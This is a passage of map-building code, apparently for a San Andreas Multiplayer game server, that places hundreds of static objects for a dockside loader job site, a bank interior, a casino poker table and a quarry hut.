CreateDynamicObject(1715,1191.19995117,-1361.80004883,1584.00000000,0.00000000,0.00000000,32.99752808); //object(kb_swivelchair2) (3)
CreateDynamicObject(2606,1191.90002441,-1358.30004883,1587.30004883,13.00000000,0.00000000,0.00000000); //object(cj_police_counter2) (1)
//======================================Грузчики========================================
CreateDynamicObject(3406,2815.25585938,-2386.14770508,9.78730011,0.00000000,10.00000000,0.00000000); //object(cxref_woodjetty) (1)
CreateDynamicObject(3406,2819.20239258,-2386.16577148,9.18729973,0.00000000,8.49755859,0.00000000); //object(cxref_woodjetty) (2)
CreateDynamicObject(8674,2815.92871094,-2385.25268555,11.69509983,0.00000000,10.00000000,0.00000000); //object(csrsfence02_lvs) (1)
CreateDynamicObject(8674,2815.90014648,-2387.14965820,11.69509983,0.00000000,9.99755859,0.00000000); //object(csrsfence02_lvs) (2)
CreateDynamicObject(982,2810.79052734,-2372.23730469,13.31159973,0.00000000,0.00000000,0.00000000); //object(fenceshit) (1)
CreateDynamicObject(982,2810.79589844,-2346.61840820,13.31159973,0.00000000,0.00000000,0.00000000); //object(fenceshit) (2)
CreateDynamicObject(8674,2815.81787109,-2389.10449219,11.69509983,0.00000000,10.00000000,0.00000000); //object(csrsfence02_lvs) (5)
CreateDynamicObject(982,2810.84960938,-2402.50000000,13.31159973,0.00000000,0.00000000,0.00000000); //object(fenceshit) (3)
CreateDynamicObject(9131,2811.02319336,-2387.14282227,13.60690022,0.00000000,0.00000000,0.00000000); //object(shbbyhswall13_lvs) (1)
CreateDynamicObject(9131,2811.12695312,-2384.92480469,13.70689964,0.00000000,0.00000000,90.00000000); //object(shbbyhswall13_lvs) (2)
CreateDynamicObject(9131,2810.47875977,-2384.86425781,12.20689964,0.00000000,88.75024414,359.50000000); //object(shbbyhswall13_lvs) (3)
CreateDynamicObject(9131,2810.35302734,-2389.48217773,12.23190022,0.00000000,88.74755859,359.49462891); //object(shbbyhswall13_lvs) (4)
CreateDynamicObject(983,2821.11206055,-2381.72045898,11.75920010,0.00000000,0.00000000,359.75000000); //object(fenceshit3) (1)
CreateDynamicObject(983,2821.00683594,-2392.21142578,11.69530010,0.00000000,0.00000000,359.24743652); //object(fenceshit3) (2)
CreateDynamicObject(9131,2820.91748047,-2384.89306641,11.95540047,0.00000000,0.00000000,0.00000000); //object(shbbyhswall13_lvs) (5)
CreateDynamicObject(9131,2820.94042969,-2389.33520508,11.95540047,0.00000000,0.00000000,0.00000000); //object(shbbyhswall13_lvs) (6)
CreateDynamicObject(6933,2803.05200195,-2386.17138672,4.77390003,0.00000000,95.50018311,0.00000000); //object(vegasplant08) (1)
CreateDynamicObject(3406,2815.28588867,-2388.16503906,9.78730011,0.00000000,9.99755859,0.00000000); //object(cxref_woodjetty) (3)
CreateDynamicObject(3406,2819.20751953,-2388.15747070,9.18729973,0.00000000,8.49243164,0.00000000); //object(cxref_woodjetty) (4)
CreateDynamicObject(9131,2811.09667969,-2389.44531250,13.68190002,0.00000000,0.00000000,0.00000000); //object(shbbyhswall13_lvs) (7)
CreateDynamicObject(6933,2803.11523438,-2387.78955078,4.77390003,0.00000000,95.49865723,0.00000000); //object(vegasplant08) (2)
CreateDynamicObject(2165,2798.19189453,-2393.62133789,12.95600033,0.00000000,0.00000000,90.00000000); //object(med_office_desk_1) (1)
CreateDynamicObject(1806,2799.00170898,-2392.99951172,12.95600033,0.00000000,0.00000000,70.00000000); //object(med_office_chair) (1)
CreateDynamicObject(1723,2793.37426758,-2392.59594727,12.95600033,0.00000000,0.00000000,0.00000000); //object(mrk_seating1) (1)
CreateDynamicObject(19172,2800.14599609,-2394.10302734,14.52840042,0.00000000,0.00000000,270.00000000); //object(samppicture1) (1)
CreateDynamicObject(2991,2787.96118164,-2407.59008789,13.26140022,0.00000000,0.00000000,0.00000000); //object(imy_bbox) (1)
CreateDynamicObject(2974,2828.32641602,-2390.89648438,13.60809994,0.00000000,0.00000000,0.00000000); //object(k_cargo1) (1)
CreateDynamicObject(2974,2828.32617188,-2390.89648438,13.60809994,0.00000000,0.00000000,0.00000000); //object(k_cargo1) (2)
CreateDynamicObject(2974,2801.51879883,-2393.76367188,12.63029957,0.00000000,0.00000000,0.00000000); //object(k_cargo1) (3)
CreateDynamicObject(2973,2831.31909180,-2390.85937500,13.60809994,0.00000000,0.00000000,0.00000000); //object(k_cargo2) (1)
CreateDynamicObject(2972,2828.33789062,-2388.85888672,13.60809994,0.00000000,0.00000000,0.00000000); //object(k_cargo4) (1)
CreateDynamicObject(2912,2828.47314453,-2388.81689453,14.80790043,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (1)
CreateDynamicObject(930,2826.31689453,-2395.71508789,11.55500031,0.00000000,0.00000000,90.00000000); //object(o2_bottles) (1)
CreateDynamicObject(1431,2821.85180664,-2382.48828125,11.62349987,0.00000000,0.00000000,88.00000000); //object(dyn_box_pile) (1)
CreateDynamicObject(2669,2835.97045898,-2496.21899414,14.94830036,0.00000000,0.00000000,270.00000000); //object(cj_chris_crate) (1)
CreateDynamicObject(2669,2835.94311523,-2505.12695312,14.94830036,0.00000000,0.00000000,270.00000000); //object(cj_chris_crate) (2)
CreateDynamicObject(2679,2833.24975586,-2496.98852539,14.86069965,0.00000000,0.00000000,0.00000000); //object(cj_chris_crate_rd) (1)
CreateDynamicObject(2678,2833.28710938,-2504.37182617,14.81490040,0.00000000,0.00000000,178.00000000); //object(cj_chris_crate_ld) (1)
CreateDynamicObject(2678,2833.22851562,-2495.46386719,14.81490040,0.00000000,0.00000000,177.99499512); //object(cj_chris_crate_ld) (2)
CreateDynamicObject(2679,2833.30053711,-2505.93139648,14.83839989,0.00000000,0.00000000,0.00000000); //object(cj_chris_crate_rd) (2)
CreateDynamicObject(2694,2833.66748047,-2506.20800781,13.83920002,0.00000000,0.00000000,0.00000000); //object(cj_shoe_box2) (1)
CreateDynamicObject(2694,2833.66699219,-2506.20800781,14.06420040,0.00000000,0.00000000,0.00000000); //object(cj_shoe_box2) (2)
CreateDynamicObject(2694,2833.66699219,-2506.20800781,14.28919983,0.00000000,0.00000000,0.00000000); //object(cj_shoe_box2) (3)
CreateDynamicObject(2694,2834.01098633,-2506.22753906,13.83920002,0.00000000,0.00000000,0.75000000); //object(cj_shoe_box2) (4)
CreateDynamicObject(2694,2834.01074219,-2506.22753906,14.03919983,0.00000000,0.00000000,0.74707031); //object(cj_shoe_box2) (5)
CreateDynamicObject(2694,2834.01074219,-2506.22753906,14.23919964,0.00000000,0.00000000,0.74707031); //object(cj_shoe_box2) (6)
CreateDynamicObject(3576,2833.78662109,-2469.72045898,15.09249973,0.00000000,0.00000000,0.00000000); //object(dockcrates2_la) (1)
CreateDynamicObject(3576,2831.04687500,-2425.95117188,15.09249973,0.00000000,0.00000000,0.00000000); //object(dockcrates2_la) (2)
CreateDynamicObject(3576,2788.23632812,-2424.93505859,14.12619972,0.00000000,0.00000000,0.00000000); //object(dockcrates2_la) (3)
CreateDynamicObject(3761,2799.48559570,-2379.30834961,14.62979984,0.00000000,0.00000000,0.00000000); //object(industshelves) (1)
CreateDynamicObject(3796,2783.32617188,-2386.66113281,12.62759972,0.00000000,0.00000000,182.00000000); //object(acbox1_sfs) (1)
CreateDynamicObject(12861,2795.20336914,-2543.79125977,12.62930012,0.00000000,0.00000000,0.00000000); //object(sw_cont05) (1)
CreateDynamicObject(2974,2837.11962891,-2496.20361328,12.70569992,0.00000000,0.00000000,0.00000000); //object(k_cargo1) (4)
CreateDynamicObject(2974,2837.83666992,-2505.00000000,12.70569992,0.00000000,0.00000000,0.00000000); //object(k_cargo1) (5)
CreateDynamicObject(2912,2835.98095703,-2497.18505859,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (2)
CreateDynamicObject(2912,2835.95581055,-2496.32177734,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (3)
CreateDynamicObject(2912,2835.98046875,-2497.18457031,14.30570030,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (4)
CreateDynamicObject(2912,2835.98046875,-2497.18457031,15.00570011,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (5)
CreateDynamicObject(2912,2835.95507812,-2496.32128906,14.40569973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (6)
CreateDynamicObject(2912,2835.93603516,-2495.38110352,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (7)
CreateDynamicObject(2912,2835.93554688,-2495.38085938,14.38070011,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (8)
CreateDynamicObject(2912,2835.93554688,-2495.38085938,15.03069973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (9)
CreateDynamicObject(2912,2835.24926758,-2495.63232422,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (10)
CreateDynamicObject(2912,2835.24902344,-2495.63183594,14.40569973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (11)
CreateDynamicObject(2912,2835.24902344,-2495.63183594,15.05570030,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (12)
CreateDynamicObject(2912,2835.25097656,-2496.44921875,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (13)
CreateDynamicObject(2912,2835.25097656,-2496.44921875,14.40569973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (14)
CreateDynamicObject(2912,2835.25097656,-2496.44921875,15.08069992,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (15)
CreateDynamicObject(2912,2834.60742188,-2496.03906250,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (16)
CreateDynamicObject(2912,2834.57177734,-2497.14038086,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (17)
CreateDynamicObject(2912,2836.62353516,-2505.10400391,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (18)
CreateDynamicObject(2912,2836.66113281,-2505.99023438,14.40569973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (19)
CreateDynamicObject(2912,2836.66113281,-2505.99023438,15.05570030,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (20)
CreateDynamicObject(2912,2836.66113281,-2505.99023438,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (21)
CreateDynamicObject(2912,2836.62304688,-2505.10351562,14.40569973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (22)
CreateDynamicObject(2912,2836.62304688,-2505.10351562,15.05570030,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (23)
CreateDynamicObject(2912,2836.60131836,-2504.14599609,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (24)
CreateDynamicObject(2912,2836.60058594,-2504.14550781,14.38070011,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (25)
CreateDynamicObject(2912,2836.60058594,-2504.14550781,15.08069992,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (26)
CreateDynamicObject(2912,2835.69311523,-2504.45800781,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (27)
CreateDynamicObject(2912,2835.69238281,-2504.45800781,14.40569973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (28)
CreateDynamicObject(2912,2835.69238281,-2504.45800781,15.10569954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (29)
CreateDynamicObject(2912,2835.68408203,-2505.26782227,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (30)
CreateDynamicObject(2912,2835.68359375,-2505.26757812,14.40569973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (31)
CreateDynamicObject(2912,2835.68359375,-2505.26757812,15.10569954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (32)
CreateDynamicObject(2912,2834.93066406,-2504.26074219,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (33)
CreateDynamicObject(2912,2834.93066406,-2504.26074219,14.40569973,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (34)
CreateDynamicObject(2912,2834.88012695,-2505.04589844,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (35)
CreateDynamicObject(2912,2835.18188477,-2506.02636719,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (36)
CreateDynamicObject(2912,2833.96850586,-2504.35717773,13.73069954,0.00000000,0.00000000,0.00000000); //object(temp_crate1) (37)
CreateDynamicObject(8572,2826.93017578,-2504.04028320,12.31140041,0.00000000,0.00000000,270.00000000); //object(vgssstairs02_lvs) (1)
CreateDynamicObject(8572,2827.19775391,-2495.25634766,12.31140041,0.00000000,0.00000000,270.00000000); //object(vgssstairs02_lvs) (2)
//======================================Банк ЛВ========================================
CreateDynamicObject(19504,2058.29882812,2381.00585938,120.80909729,0.00000000,0.00000000,177.99499512); //object(lvhouse4int) (2)
CreateDynamicObject(2775,2070.89038086,2375.33520508,121.07319641,0.00000000,0.00000000,269.25000000); //object(cj_airprt_mon) (1)
CreateDynamicObject(1550,2047.27734375,2385.50390625,118.38950348,0.00000000,0.00000000,0.00000000); //object(cj_money_bag) (1)
CreateDynamicObject(1581,2051.80322266,2382.92578125,119.76059723,0.00000000,0.00000000,358.00000000); //object(keycard) (1)
CreateDynamicObject(2922,2054.33569336,2382.85766602,119.79090118,0.00000000,0.00000000,178.00000000); //object(kmb_keypad) (1)
CreateDynamicObject(2921,2070.81347656,2373.13647461,120.75890350,0.00000000,0.00000000,0.00000000); //object(kmb_cam) (1)
CreateDynamicObject(954,2067.04223633,2384.21923828,120.87239838,0.00000000,0.00000000,0.00000000); //object(cj_horse_shoe) (1)
CreateDynamicObject(19451,2066.65917969,2384.28515625,117.92590332,0.00000000,0.00000000,270.00000000); //object(wall091) (1)
CreateDynamicObject(19451,2066.66259766,2384.45947266,117.92590332,0.00000000,0.00000000,270.00000000); //object(wall091) (3)
CreateDynamicObject(19451,2066.66552734,2384.63330078,117.92590332,0.00000000,0.00000000,270.00000000); //object(wall091) (4)
CreateDynamicObject(19432,2063.21289062,2384.31835938,119.82599640,0.00000000,0.00000000,268.99499512); //object(wall072) (1)
CreateDynamicObject(19432,2067.03369141,2384.33666992,119.82599640,0.00000000,0.00000000,267.99499512); //object(wall072) (2)
CreateDynamicObject(19432,2070.77929688,2384.36523438,119.82599640,0.00000000,0.00000000,267.99499512); //object(wall072) (3)
CreateDynamicObject(2007,2063.52685547,2388.76342773,118.66850281,0.00000000,0.00000000,0.00000000); //object(filing_cab_nu01) (1)
CreateDynamicObject(19451,2066.61523438,2389.21435547,119.80509949,0.00000000,0.00000000,270.00000000); //object(wall091) (5)
CreateDynamicObject(1649,2071.32568359,2386.91772461,120.33419800,0.00000000,0.00000000,268.00000000); //object(wglasssmash) (1)
CreateDynamicObject(1649,2071.05004883,2379.89672852,120.33419800,0.00000000,0.00000000,267.99499512); //object(wglasssmash) (3)
CreateDynamicObject(1649,2066.58886719,2372.85156250,120.33419800,0.00000000,0.00000000,177.98950195); //object(wglasssmash) (4)
CreateDynamicObject(1649,2057.93652344,2373.18676758,120.33419800,0.00000000,0.00000000,177.98950195); //object(wglasssmash) (5)
CreateDynamicObject(4206,2058.10253906,2372.72363281,120.39820099,0.00000000,270.00000000,88.49481201); //object(pershingpool_lan) (1)
CreateDynamicObject(1535,2054.14990234,2382.88183594,118.66850281,0.00000000,0.00000000,177.75000000); //object(gen_doorext14) (1)
CreateDynamicObject(2560,2068.63232422,2373.22485352,119.85310364,0.00000000,0.00000000,178.00000000); //object(curtain_2_open) (1)
CreateDynamicObject(2560,2060.04541016,2373.50048828,119.85310364,0.00000000,0.00000000,177.99499512); //object(curtain_2_open) (2)
CreateDynamicObject(2560,2070.75390625,2381.79467773,119.85310364,0.00000000,0.00000000,267.99499512); //object(curtain_2_open) (3)
CreateDynamicObject(4206,2071.70312500,2385.20092773,120.39820099,0.00000000,270.00000000,177.99487305); //object(pershingpool_lan) (1)
CreateDynamicObject(963,2048.82177734,2384.16967773,118.00270081,0.00000000,0.00000000,0.00000000); //object(cj_t_ticket) (1)
CreateDynamicObject(2003,2065.68188477,2388.86303711,119.13140106,0.00000000,0.00000000,0.00000000); //object(cr_safe_body) (1)
CreateDynamicObject(2005,2065.69067383,2388.86376953,119.02320099,0.00000000,0.00000000,0.00000000); //object(cr_safe_cash) (1)
CreateDynamicObject(2202,2068.30029297,2388.61230469,118.66850281,0.00000000,0.00000000,0.00000000); //object(photocopier_2) (1)
CreateDynamicObject(2202,2070.37060547,2375.48510742,118.66850281,0.00000000,0.00000000,268.00000000); //object(photocopier_2) (2)
CreateDynamicObject(2718,2045.80664062,2373.63476562,121.03820038,0.00000000,0.00000000,178.00000000); //object(cj_fly_killer) (1)
CreateDynamicObject(1663,2068.75952148,2386.10131836,119.13600159,0.00000000,0.00000000,0.00000000); //object(swivelchair_b) (1)
CreateDynamicObject(1704,2070.47045898,2377.82617188,118.66850281,0.00000000,0.00000000,266.00000000); //object(kb_chair03) (1)
CreateDynamicObject(1723,2070.63769531,2380.80908203,118.66850281,0.00000000,0.00000000,268.00000000); //object(mrk_seating1) (1)
CreateDynamicObject(1704,2070.64331055,2382.70947266,118.66850281,0.00000000,0.00000000,265.99548340); //object(kb_chair03) (2)
CreateDynamicObject(1999,2069.52661133,2385.05224609,118.67579651,0.00000000,0.00000000,178.00000000); //object(officedesk2) (1)
CreateDynamicObject(1999,2065.66821289,2385.03979492,118.67579651,0.00000000,0.00000000,180.99499512); //object(officedesk2) (2)
CreateDynamicObject(1663,2064.88476562,2386.05371094,119.12870026,0.00000000,0.00000000,0.00000000); //object(swivelchair_b) (2)
CreateDynamicObject(2311,2057.32055664,2374.22753906,118.66850281,0.00000000,0.00000000,358.00000000); //object(cj_tv_table2) (1)
CreateDynamicObject(1704,2056.25903320,2373.60766602,118.66850281,0.00000000,0.00000000,143.99548340); //object(kb_chair03) (3)
CreateDynamicObject(1704,2060.49804688,2374.16113281,118.66850281,0.00000000,0.00000000,239.99084473); //object(kb_chair03) (4)
CreateDynamicObject(630,2070.30761719,2373.16064453,119.69360352,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (1)
CreateDynamicObject(630,2070.30761719,2373.16015625,119.69360352,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (2)
CreateDynamicObject(630,2070.81811523,2383.47802734,119.70089722,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (3)
CreateDynamicObject(630,2058.06127930,2373.43310547,119.69360352,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (4)
CreateDynamicObject(1925,2066.62573242,2380.03051758,118.66850281,0.00000000,0.00000000,0.00000000); //object(pkr_chp_hi09) (1)
CreateDynamicObject(1649,2064.74902344,2384.27148438,121.48429871,0.00000000,0.00000000,0.98852539); //object(wglasssmash) (4)
CreateDynamicObject(1649,2069.45532227,2384.30834961,121.48429871,0.00000000,0.00000000,0.98327637); //object(wglasssmash) (4)
CreateDynamicObject(630,2063.47583008,2383.41357422,119.70089722,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (5)
CreateDynamicObject(1569,2057.22167969,2382.78857422,118.66850281,0.00000000,0.00000000,356.75000000); //object(adam_v_door) (1)
CreateDynamicObject(1569,2060.10302734,2382.68847656,118.66850281,0.00000000,0.00000000,178.99804688); //object(adam_v_door) (2)
CreateDynamicObject(630,2060.61596680,2382.15087891,119.70089722,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (6)
CreateDynamicObject(630,2056.87890625,2382.27197266,119.69360352,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (7)
CreateDynamicObject(19451,2050.97021484,2377.16455078,119.82599640,0.00000000,0.00000000,0.00000000); //object(wall091) (1)
CreateDynamicObject(19451,2050.99731445,2383.39233398,119.82599640,0.00000000,0.00000000,0.00000000); //object(wall091) (1)
CreateDynamicObject(19164,2062.51513672,2373.06445312,120.27210236,0.00000000,90.00000000,88.50000000); //object(gtasamap1) (1)
CreateDynamicObject(19174,2051.10229492,2378.46801758,120.64230347,0.00000000,0.00000000,90.00000000); //object(samppicture3) (1)
CreateDynamicObject(1723,2051.46948242,2377.39355469,118.67579651,0.00000000,0.00000000,87.99499512); //object(mrk_seating1) (2)
CreateDynamicObject(630,2051.74340820,2376.52416992,119.70089722,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (8)
CreateDynamicObject(630,2051.80957031,2380.26953125,119.70089722,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (9)
CreateDynamicObject(2311,2065.80981445,2374.15966797,118.66850281,0.00000000,0.00000000,357.99499512); //object(cj_tv_table2) (2)
CreateDynamicObject(1704,2068.80737305,2373.93823242,118.66850281,0.00000000,0.00000000,239.99084473); //object(kb_chair03) (5)
CreateDynamicObject(1704,2064.90087891,2373.39892578,118.66850281,0.00000000,0.00000000,143.99230957); //object(kb_chair03) (6)
//======================================Казино========================================
CreateDynamicObject(2763,1130.66003418,-1.70000005,1000.06011963,0.00000000,0.00000000,0.00000000); //object(cj_chick_table_2) (1)
CreateDynamicObject(2189,1130.69995117,-1.70000005,1000.50000000,0.00000000,0.00000000,0.00000000); //object(poker_tbl) (1)
CreateDynamicObject(2763,1130.69995117,-1.97399998,1000.06011963,0.00000000,0.00000000,35.00000000); //object(cj_chick_table_2) (2)
CreateDynamicObject(2763,1130.59997559,-1.60000002,1000.06011963,0.00000000,0.00000000,34.99694824); //object(cj_chick_table_2) (3)
CreateDynamicObject(2763,1130.80004883,-1.79999995,1000.06011963,0.00000000,0.00000000,325.00000000); //object(cj_chick_table_2) (4)
CreateDynamicObject(2763,1130.88000488,-1.79999995,1000.06011963,0.00000000,0.00000000,0.00000000); //object(cj_chick_table_2) (5)
CreateDynamicObject(2763,1130.47753906,-1.79980469,1000.06011963,0.00000000,0.00000000,0.00000000); //object(cj_chick_table_2) (6)
CreateDynamicObject(2763,1130.69995117,-1.44500005,1000.06011963,0.00000000,0.00000000,0.00000000); //object(cj_chick_table_2) (7)
CreateDynamicObject(1875,1130.69921875,-1.69921875,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_vlo05) (1)
CreateDynamicObject(1921,1130.53515625,-1.47753906,1000.25598145,0.00000000,0.00000000,0.00000000); //object(chip_stack12) (1)
CreateDynamicObject(1921,1130.69995117,-1.70000005,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack12) (3)
CreateDynamicObject(1930,1130.69995117,-1.60000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack13) (1)
CreateDynamicObject(1932,1130.80004883,-1.70000005,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack15) (1)
CreateDynamicObject(1933,1130.80004883,-1.76660001,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack16) (1)
CreateDynamicObject(1940,1130.69995117,-1.67999995,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack18) (3)
CreateDynamicObject(1932,1130.73999023,-1.64999998,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack15) (2)
CreateDynamicObject(1930,1130.74316406,-1.69921875,1000.63000488,0.00000000,0.00000000,0.00000000); //object(chip_stack13) (2)
CreateDynamicObject(1933,1130.66601562,-1.77929688,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack16) (2)
CreateDynamicObject(1931,1130.64001465,-1.66999996,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack14) (1)
CreateDynamicObject(1921,1130.59960938,-1.68847656,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack12) (4)
CreateDynamicObject(1930,1130.69921875,-1.73925781,1000.59997559,0.00000000,0.00000000,0.00000000); //object(chip_stack13) (3)
CreateDynamicObject(1931,1130.68945312,-1.67968750,1000.59338379,0.00000000,0.00000000,0.00000000); //object(chip_stack14) (2)
CreateDynamicObject(2310,1132.40002441,-1.70000005,1000.20001221-0.075,0.00000000,0.00000000,0.00000000); //object(mike_din_chair) (1)
CreateDynamicObject(2310,1129.00000000,-1.69921875,1000.20001221-0.075,0.00000000,0.00000000,179.99450684); //object(mike_din_chair) (2)
CreateDynamicObject(2310,1131.69995117,-3.00000000,1000.20001221-0.075,0.00000000,0.00000000,304.99145508); //object(mike_din_chair) (5)
CreateDynamicObject(2310,1129.90002441,-3.20000005,1000.20001221-0.075,0.00000000,0.00000000,240.99060059); //object(mike_din_chair) (6)
CreateDynamicObject(2310,1131.59997559,-0.20000000,1000.20001221-0.075,0.00000000,0.00000000,58.99108887); //object(mike_din_chair) (7)
CreateDynamicObject(2310,1129.90002441,-0.20000000,1000.20001221-0.075,0.00000000,0.00000000,114.99389648); //object(mike_din_chair) (8)
CreateDynamicObject(1876,1130.58105469,-1.75097656,1000.33068848,0.00000000,0.00000000,0.00000000); //object(pkr_chp_vlo03) (1)
CreateDynamicObject(1874,1131.39941406,-1.69921875,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_vlo03) (2)
CreateDynamicObject(1876,1131.15002441,-2.24000001,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_vlo06) (3)
CreateDynamicObject(1875,1130.37768555,-2.31100011,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_vlo05) (3)
CreateDynamicObject(1872,1130.34399414,-1.10000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_vlo01) (2)
CreateDynamicObject(1871,1131.04003906,-1.10000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_vlo04) (1)
CreateDynamicObject(1921,1130.30004883,-1.10000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack12) (4)
CreateDynamicObject(1930,1130.40002441,-2.29999995,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack13) (2)
CreateDynamicObject(1930,1131.40002441,-1.70000005,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack13) (3)
CreateDynamicObject(1902,1131.09997559,-2.20000005,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack08) (1)
CreateDynamicObject(1903,1131.00000000,-1.10000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack09) (1)
CreateDynamicObject(1904,1130.32995605,-2.32999992,1000.46002197,0.00000000,0.00000000,0.00000000); //object(chip_stack10) (1)
CreateDynamicObject(1900,1130.40002441,-2.40000010,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chplo07) (1)
CreateDynamicObject(1905,1130.30004883,-2.29999995,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chplo08) (1)
CreateDynamicObject(1907,1130.50000000,-2.29999995,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chplo10) (1)
CreateDynamicObject(1903,1131.11999512,-2.26665998,1000.45098877,0.00000000,0.00000000,0.00000000); //object(chip_stack09) (2)
CreateDynamicObject(1902,1131.15551758,-2.22000003,1000.47900391,0.00000000,0.00000000,0.00000000); //object(chip_stack08) (2)
CreateDynamicObject(1900,1131.00000000,-2.20000005,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chplo07) (2)
CreateDynamicObject(1905,1130.69995117,-1.79999995,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chplo08) (2)
CreateDynamicObject(1906,1131.19995117,-2.29999995,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chplo09) (1)
CreateDynamicObject(1907,1130.59997559,-1.79999995,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chplo10) (2)
CreateDynamicObject(1911,1131.34997559,-1.74000001,1000.45001221,0.00000000,0.00000000,0.00000000); //object(chip_stack11) (1)
CreateDynamicObject(1921,1131.40002441,-1.70000005,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack12) (5)
CreateDynamicObject(1919,1130.80004883,-1.60000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chplo12) (1)
CreateDynamicObject(1918,1131.00000000,-1.00000000,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_med10) (1)
CreateDynamicObject(1916,1130.59997559,-1.60000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_med08) (1)
CreateDynamicObject(1916,1131.50000000,-1.70000005,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_med08) (2)
CreateDynamicObject(1914,1131.09997559,-2.09999990,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_vlo12) (1)
CreateDynamicObject(1917,1131.30004883,-1.60000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_med09) (1)
CreateDynamicObject(1933,1131.09997559,-1.10000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack16) (3)
CreateDynamicObject(1940,1131.04687500,-1.77050781,1000.26770020,0.00000000,0.00000000,0.00000000); //object(chip_stack18) (1)
CreateDynamicObject(1941,1131.04003906,-1.00000000,1000.44445801,0.00000000,0.00000000,0.00000000); //object(chip_stack17) (1)
CreateDynamicObject(1940,1130.40002441,-1.10000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack18) (2)
CreateDynamicObject(1931,1130.30004883,-1.10000002,1000.50000000,0.00000000,0.00000000,0.00000000); //object(chip_stack14) (3)
CreateDynamicObject(1923,1130.30004883,-1.00000000,1000.50000000,0.00000000,0.00000000,0.00000000); //object(pkr_chp_hi07) (1)
CreateDynamicObject(1911,1130.80664062,-1.77148438,1000.25598145,0.00000000,0.00000000,0.00000000); //object(chip_stack11) (2)
CreateDynamicObject(1903,1130.30004883,-1.09999895,1000.59997559,0.00000000,0.00000000,0.00000000); //object(chip_stack09) (3)
// Карьер
CreateDynamicObject(3626,639.40002441,889.40002441,-42.40000153,0.00000000,0.00000000,30.00000000); //object(dckwrkhut) (1)
///==============================================================================
